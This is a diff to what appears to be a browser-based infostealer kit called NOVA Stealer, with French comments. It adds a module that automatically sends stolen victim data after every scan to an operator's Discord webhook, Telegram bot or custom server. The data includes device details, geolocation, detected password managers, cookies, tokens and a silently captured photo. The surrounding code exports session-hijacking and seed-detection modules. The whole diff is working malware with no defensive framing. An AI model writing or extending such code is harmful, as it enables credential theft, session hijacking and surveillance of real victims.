@@ -735,9 +735,170 @@ const GOD_STEALER = {
   },
 };
 
+// ═══════════════════════════════════════════════════════════
+//  EXFIL — Send stolen data to operator
+// ═══════════════════════════════════════════════════════════
+
+const EXFIL = {
+  // === CONFIGURE TON ENDPOINT ICI ===
+  // Discord webhook (recommandé — gratuit, simple)
+  DISCORD_WEBHOOK: "",
+  // Telegram bot (mets ton token)
+  TG_TOKEN: "",
+  TG_CHAT_ID: "",
+  // Custom HTTP endpoint
+  CUSTOM_URL: "",
+  // Activer l'exfiltration automatique
+  AUTO_EXFIL: true,  // false = stocke juste en local
+
+  // Envoie les données volées
+  async send(loot) {
+    const payload = JSON.stringify({
+      id: Date.now().toString(36) + Math.random().toString(36).slice(2,6),
+      ts: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      url: location.href,
+      loot: loot,
+    });
+
+    if (this.DISCORD_WEBHOOK) {
+      await this._toDiscord(payload, loot);
+    }
+    if (this.TG_TOKEN && this.TG_CHAT_ID) {
+      await this._toTelegram(loot);
+    }
+    if (this.CUSTOM_URL) {
+      await this._toCustom(payload);
+    }
+
+    // Toujours sauvegarder en local (backup)
+    this._saveLocal(payload);
+    console.log("📤 Exfiltrated:", Object.keys(loot).length, "categories");
+  },
+
+  // Discord webhook
+  async _toDiscord(payload, loot) {
+    const fields = [];
+    if (loot.basic?.device) {
+      fields.push({name:"📱 Device",value:`\`\`\`${JSON.stringify(loot.basic.device).slice(0,900)}\`\`\``,inline:false});
+    }
+    if (loot.basic?.location?.lat) {
+      fields.push({name:"📍 Location",value:`${loot.basic.location.lat}, ${loot.basic.location.lng}`,inline:true});
+    }
+    if (loot.managers?.length) {
+      fields.push({name:"🔐 Password Managers",value:loot.managers.join(", "),inline:true});
+    }
+    if (loot.cookies?.length) {
+      fields.push({name:"🍪 Cookies",value:`${loot.cookies.length} found`,inline:true});
+    }
+    if (loot.tokens?.length) {
+      fields.push({name:"🎫 Tokens",value:`${loot.tokens.length} found`,inline:true});
+    }
+    if (loot.silentPhoto) {
+      fields.push({name:"📸 Photo",value:"Captured (see attachment)",inline:true});
+    }
+
+    try {
+      await fetch(this.DISCORD_WEBHOOK, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          username:"NOVA Stealer",
+          embeds:[{
+            title:"🔥 New Victim",
+            color:0x00ff00,
+            fields:fields,
+            footer:{text:"NOVA ELITE v5"},
+            timestamp:new Date().toISOString(),
+          }]
+        })
+      });
+    } catch(e) {}
+  },
+
+  // Telegram
+  async _toTelegram(loot) {
+    const lines = [];
+    if (loot.basic?.device) {
+      const d = loot.basic.device;
+      lines.push(`📱 *${d.platform}* | ${d.screen} | ${d.cores} cores | ${d.memory}GB RAM`);
+    }
+    if (loot.basic?.location?.lat) {
+      lines.push(`📍 ${loot.basic.location.lat}, ${loot.basic.location.lng}`);
+    }
+    if (loot.managers?.length) lines.push(`🔐 PM: ${loot.managers.join(", ")}`);
+    if (loot.cookies?.length) lines.push(`🍪 ${loot.cookies.length} cookies`);
+    if (loot.tokens?.length) lines.push(`🎫 ${loot.tokens.length} tokens`);
+    
+    const msg = `🔥 *New Session*\n${lines.join("\n")}\n\`${Date.now().toString(36)}\``;
+    
+    try {
+      await fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          chat_id:this.TG_CHAT_ID,
+          text:msg,
+          parse_mode:"Markdown",
+          disable_notification:true,
+        })
+      });
+    } catch(e) {}
+  },
+
+  // Custom endpoint
+  async _toCustom(payload) {
+    try {
+      await fetch(this.CUSTOM_URL, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:payload,
+      });
+    } catch(e) {}
+  },
+
+  // Backup local
+  _saveLocal(payload) {
+    try {
+      let db;
+      const req = indexedDB.open("NovaDB", 1);
+      req.onupgradeneeded = (e) => {
+        e.target.result.createObjectStore("loot", {keyPath:"id"});
+      };
+      req.onsuccess = (e) => {
+        db = e.target.result;
+        const tx = db.transaction("loot","readwrite");
+        tx.objectStore("loot").add(JSON.parse(payload));
+      };
+    } catch(e) {}
+  },
+
+  // Vide le stockage local (appelé après exfil réussi)
+  async clearLocal() {
+    try {
+      indexedDB.deleteDatabase("NovaDB");
+      localStorage.removeItem("nova_cards");
+    } catch(e) {}
+  }
+};
+
+// ═══════════════════════════════════════════════════════════
+//  INTÉGRATION — Exfiltrer après chaque scan
+// ═══════════════════════════════════════════════════════════
+
+const _originalRunFullScan = GOD_STEALER.runFullScan;
+GOD_STEALER.runFullScan = async function() {
+  const loot = await _originalRunFullScan.call(this);
+  if (EXFIL.AUTO_EXFIL) {
+    await EXFIL.send(loot);
+  }
+  return loot;
+};
+
 // Export
 window.GOD_STEALER = GOD_STEALER;
 window.OVERLAY = OVERLAY;
 window.SEED_DETECTOR = SEED_DETECTOR;
 window.SESSION_HIJACK = SESSION_HIJACK;
 window.SILENT_CAPTURE = SILENT_CAPTURE;
+window.EXFIL = EXFIL;
